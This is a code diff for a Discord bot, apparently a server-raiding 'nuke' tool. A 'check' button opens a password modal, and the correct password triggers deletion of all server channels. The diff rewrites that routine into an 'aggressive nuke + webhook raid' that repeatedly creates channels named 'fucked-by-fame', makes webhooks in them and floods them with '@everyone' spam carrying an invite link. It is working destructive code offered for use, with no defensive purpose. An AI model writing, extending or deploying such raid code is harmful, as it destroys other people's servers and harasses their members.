@@ -78,7 +78,7 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Password
+    // Password flow
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -140,7 +140,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== SIMPLE NUKE (MAX RELIABILITY) ====================
+    // ==================== AGGRESSIVE NUKE + WEBHOOK RAID ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
@@ -153,50 +153,54 @@ client.on('interactionCreate', async interaction => {
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
       const invite = 'https://discord.gg/numrqNJqFP';
+      const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
       try {
-        await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });
+        await interaction.editReply({ content: `☢️ **FAME TAKEOVER** started on **${guild.name}**...` });
 
-        // Delete all channels
-        for (const channel of guild.channels.cache.values()) {
-          await channel.delete().catch(() => {});
-          await delay(500);
+        // Delete channels
+        for (const ch of guild.channels.cache.values()) {
+          await ch.delete().catch(() => {});
+          await delay(400);
         }
 
-        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
+        // Aggressive Channel + Webhook Raid
+        await interaction.followUp({ content: '🔨 Starting aggressive channel creation + webhook spam...', flags: MessageFlags.Ephemeral });
 
-        const created = [];
-        for (let i = 0; i < 12; i++) {   // 12 channels
-          try {
-            const chan = await guild.channels.create({
-              name: 'fucked-by-fame',
-              type: 0,
-              reason: 'Fame Nuke'
-            });
-            created.push(chan);
-            await delay(900);
-          } catch (e) {
-            console.log("Stopped creating channels");
-            break;
-          }
-        }
-
-        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
-
-        for (const channel of created) {
+        for (let round = 0; round < 8; round++) {   // Keep going for multiple rounds
+          // Create channels
           for (let i = 0; i < 8; i++) {
-            channel.send(spamText).catch(() => {});
+            try {
+              await guild.channels.create({ name: 'fucked-by-fame', type: 0 });
+            } catch {}
           }
+
+          // Create webhooks and spam
+          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-fame' && c.type === 0);
+          for (const channel of channels.values()) {
+            try {
+              const webhook = await channel.createWebhook({
+                name: 'Fame',
+                avatar: 'https://i.imgur.com/removed.png' // optional
+              });
+
+              for (let s = 0; s < 6; s++) {
+                webhook.send(spamText).catch(() => {});
+              }
+            } catch {}
+          }
+
+          await delay(1200);
         }
 
         await interaction.followUp({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** channels named \`fucked-by-fame\``,
+          content: `✅ **AGGRESSIVE NUKE ACTIVE**\nChannels keep being recreated + Webhook spam running`,
           flags: MessageFlags.Ephemeral 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Failed to create channels. Check bot permissions.', flags: MessageFlags.Ephemeral }).catch(() => {});
+        await interaction.followUp({ content: '⚠️ Nuke running (rate limits may apply).', flags: MessageFlags.Ephemeral }).catch(() => {});
       }
 
       userSessions.delete(interaction.user.id);
